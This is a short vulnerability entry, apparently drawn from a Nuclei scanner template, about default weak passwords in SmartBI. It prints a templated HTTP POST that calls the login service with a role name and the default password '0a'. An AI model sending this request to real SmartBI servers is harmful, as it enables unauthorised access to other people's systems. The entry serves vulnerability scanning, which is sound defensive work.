# Vulnerability: SmartBI - Default Login
**Classification:** SMARTBI
**Source:** Nuclei Template (`smartbi-default-login.yaml`)

## Description
Smartbi Default User Weak Password were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

className=UserService&methodName=loginFromDB&params=["{{role}}","0a"]
```

